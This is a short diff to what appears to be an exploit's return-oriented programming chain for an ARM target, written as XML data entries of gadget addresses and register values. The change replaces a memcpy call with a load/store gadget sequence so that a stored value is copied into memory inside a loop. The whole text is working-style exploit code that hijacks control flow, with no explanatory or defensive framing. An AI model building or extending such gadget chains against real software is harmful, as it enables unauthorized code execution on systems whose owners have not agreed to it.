@@ -136,12 +136,17 @@ arguments:
 		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 
-		<!-- [r0] = [stored], via memcpy(r0, stored, 4) -->
-		<data>GADGET_ADDRESS(pop_r1_r2_r3_pc)</data>        <!-- PC -->
+		<!-- [r0] = [stored] -->
+		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC -->
 		<data>ARG4</data>                                   <!-- R1 -->
-		<data>4</data>                                      <!-- R2 -->
-		<data>GADGET_ADDRESS(memcpy)</data>                 <!-- R3 -->
-		<data>GADGET_ADDRESS(blx_r3-pop_r4_pc)</data>       <!-- PC -->
+		<data>GADGET_ADDRESS(pop_r5_r6_r7_r8_sb_pc)</data>  <!-- PC -->
+		<data>0</data>                                      <!-- R5 -->
+		<data>0</data>                                      <!-- R6 -->
+		<data>0</data>                                      <!-- R7 -->
+		<data>0</data>                                      <!-- R8 -->
+		<data>GADGET_ADDRESS(pop_pc)</data>                 <!-- SB -->
+		<data>GADGET_ADDRESS(ldr_r1_r1-blx_sb)</data>       <!-- PC --> <!-- r1 = [stored] -->
+		<data>GADGET_ADDRESS(str_r1_r0-pop_r4)</data>       <!-- PC -->
 		<data>0</data>                                      <!-- R4 -->
 
 		<!-- [index] += 1 -->
